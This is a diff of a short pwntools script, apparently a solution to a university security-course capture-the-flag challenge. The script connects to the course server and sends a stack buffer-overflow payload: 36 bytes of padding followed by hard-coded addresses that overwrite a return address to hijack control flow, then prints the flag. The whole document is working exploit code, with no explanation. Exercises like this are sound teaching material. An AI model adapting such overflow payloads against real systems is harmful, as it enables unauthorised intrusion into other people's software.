@@ -1,13 +1,12 @@
-from pwn import remote
+from pwn import remote, p32
 
 SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
-PORT = 23151
+PORT = 23155
 
 remote = remote(SERVER, PORT, timeout=10000)
 
-buffer = b"a" * 128 + b"3"
+buffer = b"a" * 36 + p32(0x804a001) + p32(0xffffcef8) + p32(0x080487d9)
 
-remote.recvline()
 remote.sendline(buffer)
 flag = remote.recvline_contains(b"SSof{")
 print(flag.decode().split()[-1])
